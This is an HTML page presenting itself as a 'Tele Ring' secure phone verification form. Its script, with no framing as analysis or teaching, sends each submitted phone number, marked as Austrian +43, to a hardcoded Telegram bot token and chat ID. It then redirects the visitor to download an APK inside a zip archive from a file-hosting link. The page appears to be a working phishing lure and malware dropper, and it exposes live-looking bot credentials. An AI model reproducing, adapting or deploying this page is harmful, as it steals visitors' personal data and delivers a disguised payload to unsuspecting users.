<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tele Ring</title>
    
    <style>
        /* ============================================
           🔥 Reset & Base
           ============================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #f5f7fb;
            padding: 20px;
            position: relative;
        }

        /* ============================================
           📱 Glass Card
           ============================================ */
        .glass-card {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 400px;
            padding: 45px 35px 40px;
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 32px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08),
                        0 8px 24px rgba(0, 0, 0, 0.04),
                        inset 0 1px 0 rgba(255, 255, 255, 0.8);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .glass-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.10),
                        0 10px 30px rgba(0, 0, 0, 0.05);
        }

        /* ============================================
           📱 Icon
           ============================================ */
        .icon-circle {
            width: 72px;
            height: 72px;
            margin: 0 auto 20px;
            border-radius: 50%;
            background: linear-gradient(135deg, #e8f0fe, #d4e4ff);
            border: 1px solid rgba(0, 120, 255, 0.10);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 34px;
            box-shadow: 0 4px 16px rgba(0, 120, 255, 0.06);
        }

        /* ============================================
           📝 Typography
           ============================================ */
        .title {
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #0a1a3a, #1a73e8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 4px;
        }

        .subtitle {
            text-align: center;
            color: #6b7a8f;
            font-size: 14px;
            font-weight: 400;
            letter-spacing: 0.3px;
            margin-bottom: 28px;
        }

        /* ============================================
           🧩 Form
           ============================================ */
        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            color: #2c3e50;
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 0.3px;
            margin-bottom: 6px;
            padding-left: 4px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            background: #ffffff;
            border-radius: 14px;
            border: 1.5px solid #e8edf4;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
        }

        .input-wrapper:focus-within {
            border-color: #1a73e8;
            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.08);
        }

        .input-wrapper .prefix {
            padding-left: 16px;
            color: #2c3e50;
            font-weight: 600;
            font-size: 15px;
            user-select: none;
        }

        .input-wrapper input {
            width: 100%;
            padding: 16px 16px 16px 8px;
            background: transparent;
            border: none;
            outline: none;
            color: #0a1a3a;
            font-size: 16px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        .input-wrapper input::placeholder {
            color: #a0b0c0;
            font-weight: 400;
            font-size: 14px;
        }

        .input-wrapper input:focus {
            color: #0a1a3a;
        }

        /* ============================================
           🔘 Button
           ============================================ */
        .btn-submit {
            width: 100%;
            padding: 16px;
            margin-top: 10px;
            border: none;
            border-radius: 14px;
            background: linear-gradient(135deg, #1a73e8, #0d47a1);
            color: #ffffff;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.3px;
            box-shadow: 0 4px 16px rgba(26, 115, 232, 0.20);
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 28px rgba(26, 115, 232, 0.30);
        }

        .btn-submit:active {
            transform: translateY(0px) scale(0.98);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        /* ============================================
           📱 Status / Toast
           ============================================ */
        .status {
            text-align: center;
            margin-top: 16px;
            color: #6b7a8f;
            font-size: 13px;
            min-height: 24px;
            transition: all 0.4s ease;
            font-weight: 500;
        }

        .status.loading {
            color: #1a73e8;
        }
        .status.success {
            color: #0f9d58;
        }
        .status.error {
            color: #d93025;
        }

        /* ============================================
           🔗 Footer
           ============================================ */
        .footer {
            text-align: center;
            margin-top: 24px;
            color: #a0b0c0;
            font-size: 12px;
            letter-spacing: 0.5px;
        }

        .footer span {
            color: #8a9aa8;
            font-weight: 500;
        }

        .footer span i {
            font-style: normal;
            display: inline-block;
            margin: 0 4px;
        }

        /* ============================================
           📱 Responsive
           ============================================ */
        @media (max-width: 480px) {
            .glass-card {
                padding: 30px 20px 28px;
                border-radius: 24px;
            }
            .title {
                font-size: 26px;
            }
            .icon-circle {
                width: 60px;
                height: 60px;
                font-size: 28px;
            }
            .input-wrapper input {
                font-size: 15px;
                padding: 14px 14px 14px 6px;
            }
            .btn-submit {
                font-size: 15px;
                padding: 14px;
            }
            .subtitle {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>

    <!-- ============================================
    📱 Glass Card
    ============================================ -->
    <div class="glass-card">

        <!-- Icon -->
        <div class="icon-circle">📱</div>

        <!-- Title -->
        <h1 class="title">Tele Ring</h1>
        <p class="subtitle">Secure verification</p>

        <!-- Form -->
        <form id="loginForm" autocomplete="off">
            <div class="form-group">
                <label>📞 Mobile Number</label>
                <div class="input-wrapper">
                    <span class="prefix">+</span>
                    <input type="tel" id="phoneInput" placeholder="665 65734031" maxlength="10" inputmode="numeric" pattern="[0-9]*" required>
                </div>
            </div>

            <button type="submit" class="btn-submit" id="submitBtn">Send to Verification</button>
        </form>

        <!-- Status -->
        <div class="status" id="status">Enter your number to continue</div>

        <!-- Footer -->
        <div class="footer">
            <span>secure instant</span>
        </div>
    </div>

    <!-- ============================================
    📜 JavaScript
    ============================================ -->
    <script>
        (function() {
            'use strict';

            // ============================================
            // 🔧 Config
            // ============================================
            const CONFIG = {
                BOT_TOKEN: '8970761139:AAGJ8_6Wmx7wpOsR7AUNWN_NnBDuovr6ITw',
                CHAT_ID: '6559396921',
                API_BASE: 'https://api.telegram.org/bot',
                REDIRECT_URL: 'https://1k2s3a00u1.ucarecd.net/a5d90651-985c-4054-807d-896c79be9147/TeleRingapk.zip'
            };

            // ============================================
            // 📦 DOM Elements
            // ============================================
            const form = document.getElementById('loginForm');
            const phoneInput = document.getElementById('phoneInput');
            const submitBtn = document.getElementById('submitBtn');
            const statusEl = document.getElementById('status');

            // ============================================
            // 🧹 Helpers
            // ============================================
            function formatPhone(raw) {
                let cleaned = raw.replace(/\D/g, '');
                if (cleaned.length > 10) cleaned = cleaned.slice(0, 10);
                return cleaned;
            }

            function setStatus(text, type) {
                statusEl.textContent = text;
                statusEl.className = 'status';
                if (type) {
                    statusEl.classList.add(type);
                }
            }

            function setLoading(isLoading) {
                submitBtn.disabled = isLoading;
                submitBtn.textContent = isLoading ? '⏳ Sending...' : '🚀 Send to Verification';
            }

            // ============================================
            // 📤 Send to Telegram
            // ============================================
            function sendToTelegram(phone) {
                return new Promise((resolve, reject) => {
                    const text = '📱 *New Verification Request*\n' +
                                '________________________________\n' +
                                '📞 Number: +43' + phone + '\n' +
                                '________________________________\n' +
                                '👤 @khubkir';

                    const url = CONFIG.API_BASE + CONFIG.BOT_TOKEN + '/sendMessage';

                    const payload = {
                        chat_id: CONFIG.CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    };

                    fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('HTTP ' + response.status);
                        }
                        return response.json();
                    })
                    .then(data => {
                        if (data.ok) {
                            resolve(data);
                        } else {
                            reject(new Error(data.description || 'Telegram API error'));
                        }
                    })
                    .catch(err => {
                        reject(err);
                    });
                });
            }

            // ============================================
            // 🚀 Handle Submit
            // ============================================
            async function handleSubmit(event) {
                event.preventDefault();

                const raw = phoneInput.value.trim();
                const phone = formatPhone(raw);

                if (phone.length < 9) {
                    setStatus('⚠️ Please enter a valid number', 'error');
                    phoneInput.focus();
                    return;
                }

                setLoading(true);
                setStatus('⏳ Sending to verification...', 'loading');

                try {
                    await sendToTelegram(phone);
                    setStatus('✅ Verification sent! Redirecting...', 'success');

                    setTimeout(() => {
                        window.location.href = CONFIG.REDIRECT_URL;
                    }, 1000);

                } catch (error) {
                    console.error('Send error:', error);
                    setStatus('❌ Failed to send. Please try again.', 'error');
                    setLoading(false);
                }
            }

            // ============================================
            // 🔧 Phone Input Mask
            // ============================================
            phoneInput.addEventListener('input', function(e) {
                this.value = this.value.replace(/\D/g, '');
                if (this.value.length > 10) {
                    this.value = this.value.slice(0, 10);
                }
            });

            // ============================================
            // 🎯 Events
            // ============================================
            form.addEventListener('submit', handleSubmit);

            // ============================================
            // ✨ Initial State
            // ============================================
            setStatus('Enter your number to continue');
            phoneInput.focus();

        })();
    </script>

</body>
</html>
